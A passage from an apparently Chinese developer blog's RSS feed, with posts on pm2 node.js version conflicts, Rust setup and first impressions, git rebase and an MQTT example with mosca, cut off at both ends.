    at Module._compile (module.js:413:34)
    at Object.Module._extensions..js (module.js:422:10)
    at Module.load (module.js:357:32)
    at Function.Module._load (module.js:314:12)
</pre>

<p>
改了一下 heapdump/lib/main.js:18:15 附近的代码，输出了真正的错误信息：
</p>
<pre class="example">
Error: Module version mismatch. Expected 47, got 46.
</pre>

<p>
根据 node_version.h 中 NODE_MODULE_VERSION 的定义，46 对应 Node.js v4.0.0，47 对应 Node.js v5.0.0。
应该是编译 heapdump 模块使用的 Node.js 版本和运行时 Node.js 版本不一致，编译时我通过 $PATH 环境变量，将 Node.js v4.2.3 置为默认的 Node.js 版本了。
</p>
<pre class="example">
$ /usr/bin/node --version 
v5.7.0
$ node --version
v4.2.3
</pre>

<p>
我使用的是 pm2 做为进程管理器，cluster 模式运行 node.js 应用，pm2 后台进程使用的是默认版本的 Node.js 版本（v5.7.0）启动，应该是 pm2 也使用同样的 Node.js 版本（v5.7.0）来运行应用，执行 pm2 save 后，~/.pm2/dump.pm2 中我的应用的 $PATH 是正确的，已经将 Node.js v4.2.3 置为默认的 Node.js 版本，不知为何 pm2 并未采用。
</p>

<p>
pm2 分为前端命令和后端 daemon 两部分，真正的操作都是由 daemon 来施行，当我们使用 pm2 start 来启动 app 时，只是把命令通过 unix socket 传递给了 daemon，一个合理的猜想是 pm2 命令并没有把当前 shell 的 $PATH 传递给 daemon，或者是 daemon 创建 app 进程时传递过来的 $PATH 设置未生效。
</p>

<p>
查看当前的 pm2 版本：
</p>
<pre class="example">
$ ps aux | grep PM2 | grep -v grep 
tangxin+ 17538  0.1  0.4 1185564 32020 ?       Ssl  2月25   9:29 PM2 v0.14.5: God Daemon
</pre>

<p>
通过 &#x2013;interpreter 选项启动应用时指定 Node.js v4.2.3： &#x2013;interpreter=/usr/local/node-v4.2.3/bin/node
</p>

<p>
通过 pm2 delete 删除应用后再 start 应用，结果还是一样的错误，查看应用实际使用的 node 版本：
</p>
<pre class="example">
$ ls -la /proc/22387/exe
lrwxrwxrwx 1 tangxinfa tangxinfa 0 3月   2 14:00 /proc/22387/exe -&gt; /usr/bin/node
</pre>
<p>
使用的还是系统默认的 Node.js 版本 v5.7.0。
</p>

<p>
经过测试，可以确认：
</p>
<blockquote>
<p>
通过 &#x2013;interpreter 指定其它 node 版本，在 cluster 模式下无效，fork 模式下有效。
</p>
</blockquote>

<p>
参见相关 Issues：
</p>

<ul class="org-ul">
<li><a href="https://github.com/Unitech/PM2/issues/1575">interpreter ignored when using cluster mode · Issue #1575 · Unitech/pm2</a></li>

<li><a href="https://github.com/Unitech/PM2/issues/1034">Using different versions of node via nvm for each app · Issue #1034 · Unitech/pm2</a></li>

<li><a href="https://github.com/Unitech/PM2/issues/1224#issuecomment-99931316">&#x2013;interpreter not applied? · Issue #1224 · Unitech/pm2</a></li>
</ul>


<p>
查看 pm2 与 node.js 的源代码进一步确认该问题：
</p>

<ul class="org-ul">
<li><p>
pm2 调用 cluster.fork 创建工作进程
</p>

<p>
引用自 pm2/lib/God/ClusterMode.js
</p>
<div class="org-src-container">
<pre class="src src-js">cluster.fork({pm2_env: JSON.stringify(env_copy)})
</pre>
</div></li>

<li><p>
cluster.fork 调用 child_process.fork 创建工作进程
</p>

<p>
引用自 node/lib/cluster.js
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">return</span> fork(cluster.settings.exec, cluster.settings.args, {
<span style="color: #969896; background-color: #22a224a427a7;"> </span> env: workerEnv,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> silent: cluster.settings.silent,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> execArgv: execArgv,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> gid: cluster.settings.gid,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> uid: cluster.settings.uid
});
</pre>
</div>

<p>
根据 child_process.fork 的实现（见 node/lib/child_process.js），由于未传入 <code>execPath</code> 选项，会使用 <code>process.execPath</code> 的值，也就是会使用 pm2 后台进程的 node 可执行程序路径来创建工作进程。
</p></li>
</ul>

<p>
应该可以通过指定不同的 $PM2_HOME 环境变量，跑多套 pm2，各个 pm2 使用不同版本的 Node.js，多个 cluster 模式的 pm2 应用也就会使用不同版本 Node.js。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Archlinux 下搭建 Rust 开发环境]]></title>
            <link>/article/archlinux-4e0b642d5efa-rust-5f0053d173af5883.html</link>
            <guid>/article/archlinux-4e0b642d5efa-rust-5f0053d173af5883.html</guid>
            <pubDate>Mon, 29 Feb 2016 12:03:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li><p>
Emacs 里安装 rust-mode
</p>

<p>
M-x el-get-install rust-mode
</p></li>

<li><p>
Archlinux 安装 rust 相关包
</p>

<p>
yaourt -S rust cargo
</p>

<p>
安装的版本
</p>

<pre class="example">
$ rustc --version
rustc 1.6.0
$ cargo --version
cargo 0.8.0 (28a0cbb 2016-01-17)
</pre></li>

<li><p>
Hello world!
</p>

<p>
<code>hello_world.rs</code>
</p>
<div class="org-src-container">
<pre class="src src-rust"><span style="color: #b5bd68;">fn</span> <span style="color: #de935f;">main</span>() {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b294bb;">println!</span>(<span style="color: #8abeb7;">"Hello, world!"</span>);
}
</pre>
</div>

<p>
编译运行
</p>
<pre class="example">
$ rustc hello_world.rs 
$ ./hello_world 
Hello, world!
</pre></li>

<li><p>
更多配置
</p>

<p>
可以参考文章《<a href="http://bassam.co/emacs/2015/08/24/rust-with-emacs/">Configuring Emacs for Rust</a>》进行更高级的配置，对于我这种 Rust 还没入门的人来说，前面的配置已经足够，还是一步一个脚印吧。</p></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Rust 是 C++ 的继承者]]></title>
            <link>/article/rust-662f-c-76847ee7627f8005.html</link>
            <guid>/article/rust-662f-c-76847ee7627f8005.html</guid>
            <pubDate>Mon, 29 Feb 2016 11:35:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
刚看完《<a href="http://killercup.github.io/trpl-ebook/trpl-2015-09-26.html">Rust Programming Language</a>》开头章节“A brief introduction to Rust”，第一个例子就可以看出它是 C++ 的继承者，相信每个 C++ 开发者会忍不住会心一笑。
</p>

<p>
看以下代码
</p>
<div class="org-src-container">
<pre class="src src-rust"><span style="color: #b5bd68;">fn</span> <span style="color: #de935f;">main</span>() {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">let</span> <span style="color: #b5bd68;">mut</span> <span style="color: #f0c674;">x</span> = <span style="color: #b294bb;">vec!</span>[<span style="color: #8abeb7;">"Hello"</span>, <span style="color: #8abeb7;">"world"</span>];

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">let</span> <span style="color: #f0c674;">y</span> = &amp;x[0];

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   x.push(<span style="color: #8abeb7;">"foo"</span>);
}
</pre>
</div>

<p>
会编译出错
</p>
<pre class="example">
error: cannot borrow `x` as mutable because it is also borrowed as immutable
      x.push("foo");
      ^
  note: previous borrow of `x` occurs here; the immutable borrow prevents
  subsequent moves or mutable borrows of `x` until the borrow ends
      let y = &amp;x[0];
               ^
  note: previous borrow ends here
  fn main() {

  }
  ^
</pre>

<p>
可以这样修复
</p>
<div class="org-src-container">
<pre class="src src-rust"><span style="color: #b5bd68;">fn</span> <span style="color: #de935f;">main</span>() {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">let</span> <span style="color: #b5bd68;">mut</span> <span style="color: #f0c674;">x</span> = <span style="color: #b294bb;">vec!</span>[<span style="color: #8abeb7;">"Hello"</span>, <span style="color: #8abeb7;">"world"</span>];

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">let</span> <span style="color: #f0c674;">y</span> = x[0].clone();

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   x.push(<span style="color: #8abeb7;">"foo"</span>);
}
</pre>
</div>

<p>
也可以这样修复
</p>
<div class="org-src-container">
<pre class="src src-rust"><span style="color: #b5bd68;">fn</span> <span style="color: #de935f;">main</span>() {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">let</span> <span style="color: #b5bd68;">mut</span> <span style="color: #f0c674;">x</span> = <span style="color: #b294bb;">vec!</span>[<span style="color: #8abeb7;">"Hello"</span>, <span style="color: #8abeb7;">"world"</span>];

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">let</span> <span style="color: #f0c674;">y</span> = &amp;x[0];
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }

<span style="color: #969896; background-color: #22a224a427a7;"> </span>   x.push(<span style="color: #8abeb7;">"foo"</span>);
}
</pre>
</div>

<p>
再多新颖的关键字也掩不住骨子里的 C++ 气息：作用域、引用，还有代码未明确表达的 “move语义”、RAII等。
</p>

<p>
考虑到 Rust 宣称是一门“安全”、“高效”、“并发”的语言，消除了大量 C++ 的缺陷，对于一个掌握 C++ 的开发人员来说，语法形式上添加的繁琐不是问题，只要是经得起推敲那就是合理的。
</p>

<p>
Rust 是由 <a href="https://github.com/servo/servo">Servo</a> （浏览器引擎）项目驱动的，这导致现阶段 Rust 的定位是客户端系统软件开发，服务端高并发相关的需求被延后（如：异步I/O、协程），从这一点上看 Rust、Golang 其实是互补的。
</p>

<p>
Rust 的主要特性：
</p>

<ul class="org-ul">
<li><p>
基本类型
</p>

<p>
与 C++ 相似
</p></li>

<li><p>
模板
</p>

<p>
与 C++ 相似，更友好的错误信息
</p></li>

<li><p>
Trait
</p>

<p>
Rust 语言级的支持，没有继承，通过 Trait 实现了运行时多态
</p></li>

<li>RAII</li>

<li>静态类型及自动类型推导</li>

<li>模块化支持</li>

<li>文档及测试</li>

<li><p>
宏
</p>

<p>
Rust 的宏更安全，不同于 C++ 的基于文本的替换，Rust 的宏是语义完备的。
</p></li>

<li><p>
安全优先
</p>

<p>
Rust 设计上的主要考虑就是安全（Safety），如变量定义默认是 const 的，borrow checker，lifetime等,
强大的编译期检测。</p></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[计划学一门新语言：Rust]]></title>
            <link>/article/8ba152125b664e0095e865b08bed8a00ff1a-rust.html</link>
            <guid>/article/8ba152125b664e0095e865b08bed8a00ff1a-rust.html</guid>
            <pubDate>Mon, 29 Feb 2016 09:52:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
常常听到每年学一门新语言的建议，想想还是有道理的，可能主力开发语言还是一两种，但是拓宽视野才是关键。
</p>

<p>
一开始比较倾向于 golang ，语言设计简单、后台硬，而且有很多杀手级应用。
</p>

<p>
但是自已用 node.js 开发后台应用接近两年时间，除了部署时要下载一大堆包，并且包的兼容性变化较大这一点缺陷外，无论是开发效率和运行效率都合我意。再学一门应用领域差不多的 golang 有点动力不够。
</p>

<p>
rust 看起来和手头上的语言差异较大，是一门严肃认真的语言，野心不小，反正也没指望立即拿它混饭吃，就暂定它吧。
</p>

<p>
学习计划分为以下阶段：
</p>

<ul class="org-ul">
<li><p>
学习语言本身并做一些示例练习
</p>

<p>
从 《Rust Programming Language》一书入手。
</p>

<p>
预计用一部分 3、4 月份的业余时间。
</p></li>

<li><p>
用于写一些对自已有用的临时性项目
</p>

<p>
预计用一部分 5、6 月份的业余时间。
</p></li>

<li><p>
参与一些开源项目
</p>

<p>
预计 7 月份之后的时间吧。
</p></li>

<li><p>
用于产品开发
</p>

<p>
如果这门语言本身经得起考验的话，不排除在工作中的一些小项目上正式使用。</p></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[CentOS 6.4 生产环境上安装 pm2]]></title>
            <link>/article/centos-6.4-751f4ea773af58834e0a5b8988c5-pm2.html</link>
            <guid>/article/centos-6.4-751f4ea773af58834e0a5b8988c5-pm2.html</guid>
            <pubDate>Thu, 25 Feb 2016 09:27:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
确保系统要干净（尚未安装 node.js），使用 root 帐号登录。
</p>

<ul class="org-ul">
<li><p>
安装 LTS 版的 node.js
</p>

<p>
当前 <a href="https://nodejs.org/en/">官方</a> 推荐的 LTS 版本为 v4.3.1，通过淘宝镜像下载速度快一些，直接安装在系统目录中 /usr 下，便于使用。
</p>

<div class="org-src-container">
<pre class="src src-sh">wget http://npm.taobao.org/mirrors/node/latest-v4.x/node-v4.3.1-linux-x64.tar.xz<span style="text-decoration: underline;"> -O node-v4.3.1-linux-x64.tar.xz</span>
tar xJvf node-v4.3.1-linux-x64.tar.xz --no-same-owner --exclude CHANGELOG.md --e<span style="text-decoration: underline;">xclude LICENSE --exclude README.md --strip-components 1 -C /usr</span>
</pre>
</div>

<p>
参考：<a href="https://gist.github.com/TooTallNate/2477f53a23a51537332e">Install Node.js one-liner</a>
</p></li>

<li><p>
安装稳定版 pm2
</p>

<p>
从 <a href="https://github.com/Unitech/pm2/blob/master/CHANGELOG.md">CHANGELOG.md</a> 查到的当前的稳定版本为 v0.14.3，pm2 发布很频繁,不宜追新。
</p>

<div class="org-src-container">
<pre class="src src-sh">npm install pm2@0.14.3 -g
</pre>
</div></li>

<li><p>
设置 pm2 为开机启动
</p>

<div class="org-src-container">
<pre class="src src-sh">pm2 startup centos
</pre>
</div></li>

<li><p>
定期清理日志
</p>

<p>
按《 <a href="http://blog.kankanan.com/article/pm2-768465e55fd77ba17406.html#sec-6">pm2的日志管理</a> 》中的“定期清理日志”一节所述使用 logrotate 服务定期清理日志。</p></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[使用 pm2 管理应用]]></title>
            <link>/article/4f7f7528-pm2-7ba174065e947528.html</link>
            <guid>/article/4f7f7528-pm2-7ba174065e947528.html</guid>
            <pubDate>Thu, 25 Feb 2016 07:18:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
pm2 是使用 node.js 开发的进程管理器，实现统一方式管理进程，如：崩溃后拉起、启动/停止、监控、日志管理等。
</p>

<div id="outline-container-org2527914" class="outline-2">
<h2 id="org2527914">安装</h2>
<div class="outline-text-2" id="text-org2527914">
<div class="org-src-container">
<pre class="src src-sh">npm install pm2@latest -g
</pre>
</div>
</div>

<div id="outline-container-org39331ae" class="outline-3">
<h3 id="org39331ae">为什么要全局（global）方式安装 pm2？</h3>
<div class="outline-text-3" id="text-org39331ae">
<p>
pm2 被设计成管理用户的全部应用，pm2 的数据保存在 ~/.pm2 目录下，同一用户只能启动一个 pm2 后台进程（PM2 daemon），不同用户的 pm2 互不影响。
不安装为全局的情况下，如果安装多个版本的 pm2，不同版本的 pm2 前端工具程序与 pm2 后台进程（PM2 daemon）交互是有风险的。
</p>
</div>
</div>
</div>

<div id="outline-container-org4b24a3e" class="outline-2">
<h2 id="org4b24a3e">应用管理</h2>
<div class="outline-text-2" id="text-org4b24a3e">
<ul class="org-ul">
<li><p>
启动应用
</p>

<div class="org-src-container">
<pre class="src src-sh">pm2 start -n app1 app1.js
pm2 start -n app2 app2.js
</pre>
</div></li>

<li><p>
列出应用
</p>

<div class="org-src-container">
<pre class="src src-sh">pm2 list
</pre>
</div></li>

<li><p>
应用详情
</p>

<div class="org-src-container">
<pre class="src src-sh">pm2 describe app1
</pre>
</div></li>

<li><p>
停止应用
</p>

<div class="org-src-container">
<pre class="src src-sh">pm2 stop app1
pm2 stop app2
</pre>
</div></li>

<li><p>
删除应用
</p>

<div class="org-src-container">
<pre class="src src-sh">pm2 delete app1
pm2 delete app2
</pre>
</div></li>
</ul>
</div>
</div>

<div id="outline-container-org6839f11" class="outline-2">
<h2 id="org6839f11">开机启动</h2>
<div class="outline-text-2" id="text-org6839f11">
<p>
应用启动后需要保存，应用才会在开机后由 pm2 服务启动。
</p>

<div class="org-src-container">
<pre class="src src-sh">pm2 save
</pre>
</div>

<p>
创建 pm2 系统服务，开机启动 pm2
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo pm2 startup systemd -u app
</pre>
</div>

<p>
不重启试运行一下，看是否正常
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#28165;&#31354;&#36827;&#31243;&#24182;&#36864;&#20986; pm2&#65292;&#22238;&#21040;&#24178;&#20928;&#30340;&#31995;&#32479;&#29366;&#24577;</span>
sudo systemctl stop pm2
ps aux | grep node

<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">&#21551;&#21160; pm2 &#26381;&#21153;&#65292;&#39564;&#35777;&#19968;&#19979;&#24212;&#29992;&#26159;&#21542;&#27491;&#24120;&#21551;&#21160;</span>
sudo systemctl start pm2
pm2 list
</pre>
</div>
</div>
</div>

<div id="outline-container-org1e99174" class="outline-2">
<h2 id="org1e99174">日志管理</h2>
<div class="outline-text-2" id="text-org1e99174">
<p>
《 <a href="http://blog.kankanan.com/article/pm2-768465e55fd77ba17406.html">pm2的日志管理</a> 》有详细描述。
</p>
</div>
</div>

<div id="outline-container-org594bb55" class="outline-2">
<h2 id="org594bb55">多 node.js 版本共存</h2>
<div class="outline-text-2" id="text-org594bb55">
<p>
pm2 本身就是 node.js 开发的程序，依赖 node.js，pm2 应用可以使用不同版本的 node.js。
</p>

<p>
pm2 命令行工具会通过“#!/usr/bin/env node”方式引用 node，如果应用也以同样的方式引用 node.js，就要随时注意切换 node.js 版本，一不小心 pm2 命令行工具和 pm2 应用使用的 node.js 版本会错乱，有一定风险性。一个 node.js 版本安装的模块不能保证与另一个 node.js 版本兼容，特别是一些 c++ 扩展模块。
</p>

<p>
我以前的实践中，应用会提供一个环境脚本 .bashrc ，在操作某个应用时，总是会通过 <code>source .bashrc</code> 先设置应用的 shell 环境变量，通过 $PATH 环境变量指定 node 命令为应用所需的 node.js 版本不是一个好主意，当操作 pm2 时，pm2 也会使用这个应用的 node.js 版本。
</p>

<p>
从这一点上看，不应该使用 node.js 、php、python、ruby 之类的脚本语言来开发进程管理器，它本身的依赖管理就是个大麻烦，使用 go、c 或 c++ 来开发会好得多。
</p>

<p>
理想情况下，pm2 和 应用（app）总是使用正确的 node.js 版本，可以归为以下三种情形。新应用应该总是假设布署环境为情形 1，不要过多考虑系统运行的 node.js 版本，这也就要求应用能够兼容各种 node.js 版本，但是现实情况是，node.js 以及 javascript 发展得太快了，应用依赖的各种 node.js 模块也往往做不到兼容各种 node.js 版本，很多模块基于实现的简洁性考虑，提供多个版本分别对应不同的 node.js 版本，导致应用也必须从一开始就选择特定的 node.js 版本，不同团队、人员及项目跟进新技术步调不一致时，情形 2 及情形 3 是现实的选择。
</p>
</div>

<div id="outline-container-orgeab53c1" class="outline-3">
<h3 id="orgeab53c1">情形 1：系统中只有一个 node.js 版本，并且是全局安装</h3>
<div class="outline-text-3" id="text-orgeab53c1">
<p>
在专机专用的生产环境下，这种情形会很常见，特别是 docker 容器环境下。
</p>

<p>
这是最简单的一种情况，不需要为 node.js 版本操心，整个开发组织在 node.js 版本选择上共进退，保持一致。
</p>
</div>
</div>

<div id="outline-container-org8f94c11" class="outline-3">
<h3 id="org8f94c11">情形 2：系统中有一个全局 node.js 版本，应用有自已的 node.js 版本</h3>
<div class="outline-text-3" id="text-org8f94c11">
<p>
开发环境下，或者同一机器部署大量微服务的情况下，一般就是这种情形。
</p>

<p>
这是最复杂的一种情况，在运行应用代码的时候，要确保切到应用所需的 node.js 版本，在执行 pm2 操作的时候，要确保切到 pm2 所需的 node.js 版本，有如履薄冰的感觉。
</p>

<p>
node.js 版本需要在以下方面正确匹配：
</p>

<ul class="org-ul">
<li><p>
pm2 的 node.js 版本
</p>

<p>
pm2 本身就是一套用户全局的进程管理工具，使用全局的 node.js 版本是自然而然的选择。
</p>

<p>
否则就一定要记得使用正确的 node.js 版本运行 pm2：/usr/local/node-v5.0.0/bin/node pm2 list，很是不便。
</p></li>

<li><p>
应用的 node.js 版本
</p>

<p>
建议使用 <code>--interpreter</code> 选项指定 node.js 版本，参见讨论：<a href="https://github.com/Unitech/PM2/issues/1034">Using different versions of node via nvm for each app · Issue #1034 · Unitech/pm2</a> 。
</p>

<p>
警告：pm2 在 <code>cluster</code> 模式下， <code>--interpreter</code> 选项被忽略，详见：<a href="http://blog.kankanan.com/article/module-version-mismatch-95198bef639267e5.html">Module version mismatch 错误排查 | 看看俺 – KanKanAn.com</a> 。
</p>

<p>
这是最关键的一点，应用的 node.js 版本不对，可能导致应用启动失败，中断服务。
</p></li>

<li><p>
应用的辅助脚本的 node.js 版本
</p>

<p>
使用 node.js 开发的应用附带命令行工具运行时如果 node.js 版本不对，通常不会对运行中的服务造成影响。
</p>

<p>
可以简单地写一些 shell 脚本封装，在 shell 脚本中指定正确的 node.js 版本，如：
</p>

<p>
<code>dump.sh</code>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/</span><span style="color: #b5bd68;">bash</span>

/usr/local/node-v5.0.0/bin/node ./dump.js
</pre>
</div>

<p>
也可以直接在 node.js 脚本中引用正确的 node.js 版本，如：
</p>

<p>
<code>dump.js</code>
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #969896; font-style: italic;">#!/usr/local/node-v5.0.0/bin/node</span>

<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">fs</span> = require(<span style="color: #8abeb7;">'fs'</span>);
...
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">chmod a+x dump.js
./dump.js
</pre>
</div></li>
</ul>
</div>
</div>

<div id="outline-container-org313e877" class="outline-3">
<h3 id="org313e877">情形 3：系统没有全局 node.js 版本，应用各自维护 node.js 版本</h3>
<div class="outline-text-3" id="text-org313e877">
<p>
这是上面情况的简化版，考验开发、运维团队的纪律性。
</p>

<p>
由于 $PATH 中没有 node.js，不会由于没有指定 node.js 绝对路径无意间引用错误的 node.js 版本。
</p>

<p>
可以把 node.js 安装在应用根目录下，如下目录结构所示：
</p>

<pre class="example">
Applications
|
|
|--- Application 1
|         |
|         |--------- node
|         |
|         |--------- package.json
|         |
|         |--------- ...
|
|    
|--- Application 2
|         |
|         |--------- node
|         |
|         |--------- package.json
|         |
|         |--------- ...
|
|
|--- Application 3
|         |
|         |--------- node
|         |
|         |--------- package.json
|         |
|         |--------- ...
|
</pre>

<p>
甚至 pm2 也通过以上方式安装自已的 node.js 版本。
</p>

<p>
通过 ./node/bin/node 引用 node.js 可执行程序，不要试图通过将 ./node/bin 目录加到 $PATH 中以简化使用，否则操作不同应用或 pm2 时，又会一不小心引用到错误的 node.js 版本。
</p>
</div>
</div>
</div>

<div id="outline-container-org51f1458" class="outline-2">
<h2 id="org51f1458">参考</h2>
<div class="outline-text-2" id="text-org51f1458">
<p>
<a href="http://pm2.keymetrics.io/docs/usage/pm2-doc-single-page/">PM2 - One page documentation</a></p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[git多人协作：维护干净的提交树]]></title>
            <link>/article/git-591a4eba534f4f5cff1a7ef462a45e7251c0768463d04ea46811.html</link>
            <guid>/article/git-591a4eba534f4f5cff1a7ef462a45e7251c0768463d04ea46811.html</guid>
            <pubDate>Sun, 21 Feb 2016 05:14:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
很多开源项目是被强制要求维护干净的提交树，上游容易合并你通过 pull request 提交的补丁，要实现这一点，pull 代码时需要使用 rebase 替换默认的 merge 方式。
</p>

<div class="org-src-container">
<pre class="src src-sh">git pull --rebase
</pre>
</div>

<p>
git pull 时自动进行 rebase。
</p>

<ul class="org-ul">
<li><p>
全局开启
</p>

<div class="org-src-container">
<pre class="src src-sh">git config --global pull.rebase true
</pre>
</div></li>

<li><p>
当前分支开启
</p>

<div class="org-src-container">
<pre class="src src-sh">git config branch.master.rebase true
</pre>
</div></li>
</ul>

<p>
现在，如果你的工作区有未提交的代码，是不允许 pull 的，需要 stash 将工作区清理一下，等 pull 完成再恢复一下。
</p>

<div class="org-src-container">
<pre class="src src-sh">git stash
git pull
git stash pop
</pre>
</div>

<p>
使用 rebase 模式相对来说麻烦一些，但是好处就是中心仓库的提交历史是线性的，特别是通过 pull request 提交补丁来协作开发的时候，接收方随时可以将补丁合并进来，完全没有 merge 模式合并补丁那么麻烦。强烈建议默认情况下使用这种模式。</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[node.js下进行mqtt实践]]></title>
            <link>/article/node.js-4e0b8fdb884c-mqtt-5b9e8df5.html</link>
            <guid>/article/node.js-4e0b8fdb884c-mqtt-5b9e8df5.html</guid>
            <pubDate>Sun, 21 Feb 2016 05:13:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
通过 mqtt 可以将设备连接在一起，能够实现将消息（可能来自服务器也可能来自其它设备）推送到设备，如果设备离线，
服务器可以暂存消息，在设备上线时再推送，有一些特性很关键：
</p>

<ul class="org-ul">
<li><p>
offline
</p>

<p>
允许设备暂时离线。
</p>

<p>
即使是使用固定宽带，有些用户也会因为各种原因无法保持稳定的长连接，可能是上级路由设备有限制，或者是带宽被其它应用抢占而导致长连接不稳定。
将设备的在线状态与 TCP 长连接状态耦合在一起是不明智的。
</p></li>

<li><p>
bridge
</p>

<p>
设备连接在不同的 broker 上，通过 bridge 实现互通。
</p>

<p>
支持几万台设备在线，估计一台 broker 就够了，但是一旦达到数十万、百万甚至上亿，肯定需要搭建 broker 集群，参见 <a href="http://www.kegel.com/c10k.html">The C10K problem</a>。
</p></li>
</ul>

<p>
简单起见， node.js 服务器端使用 <a href="https://github.com/mcollina/mosca">mosca</a>， 客户端使用 <a href="https://github.com/mqttjs/MQTT.js">MQTT.js</a> ，由于 <a href="https://github.com/mcollina/mosca">mosca</a> 不支持 bridge，本文不涉及 bridge 特性。
</p>

<div id="outline-container-org296d49c" class="outline-2">
<h2 id="org296d49c">客户端与服务器通信</h2>
<div class="outline-text-2" id="text-org296d49c">
<ul class="org-ul">
<li><p>
客户端通过服务器给自已发个消息
</p>

<p>
<code>server.js</code>
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">mosca</span> = require(<span style="color: #8abeb7;">'mosca'</span>);

<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">settings</span> = {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   port: 1883
};

<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">server</span> = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">mosca.Server</span>(settings);
server.on(<span style="color: #8abeb7;">'ready'</span>, <span style="color: #b5bd68;">function</span> () {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.log(<span style="color: #8abeb7;">'mosca server running'</span>);
}).on(<span style="color: #8abeb7;">'clientConnected'</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">client</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.log(<span style="color: #8abeb7;">'client('</span> + client.id + <span style="color: #8abeb7;">') connected'</span>);
}).on(<span style="color: #8abeb7;">'published'</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">packet</span>, <span style="color: #f0c674;">client</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.log(<span style="color: #8abeb7;">'client('</span> + (client ? client.id : <span style="color: #8abeb7;">'internal'</span>) + <span style="color: #8abeb7;">') published top</span><span style="color: #8abeb7; text-decoration: underline;">ic('</span><span style="text-decoration: underline;"> + packet.topic + </span><span style="color: #8abeb7; text-decoration: underline;">'): '</span><span style="text-decoration: underline;"> + packet.payload);</span>
}).on(<span style="color: #8abeb7;">'subscribed'</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">topic</span>, <span style="color: #f0c674;">client</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.log(<span style="color: #8abeb7;">'client('</span> + client.id + <span style="color: #8abeb7;">') subscribed topic('</span> + topic + <span style="color: #8abeb7;">')'</span>);
}).on(<span style="color: #8abeb7;">'unsubscribed'</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">topic</span>, <span style="color: #f0c674;">client</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.log(<span style="color: #8abeb7;">'client('</span> + client.id + <span style="color: #8abeb7;">') unsubscribed topic('</span> + topic + <span style="color: #8abeb7;">')'</span>);
}).on(<span style="color: #8abeb7;">'clientDisconnecting'</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">client</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.log(<span style="color: #8abeb7;">'client('</span> + client.id + <span style="color: #8abeb7;">') disconnecting'</span>);
}).on(<span style="color: #8abeb7;">'clientDisconnected'</span>, <span style="color: #b5bd68;">function</span> (<span style="color: #f0c674;">client</span>) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   console.log(<span style="color: #8abeb7;">'client('</span> + client.id + <span style="color: #8abeb7;">') disconnected'</span>);
});
</pre>
</div>

<p>
<code>client.js</code>
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">mqtt</span> = require(<span style="color: #8abeb7;">'mqtt'</span>);


<span style="color: #b5bd68;">var</span> <span style="color: #f0c674;">client</span> = mqtt.connect(<span style="color: #8abeb7;">'mqtt://127.0.0.1:1883'</span>);
client.on(<span style="color: #8abeb7;">'connect'</span>, <span style="color: #b5bd68;">function</span> () {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   client.subscribe(<span style="color: #8abeb7;">'presence'</span>);
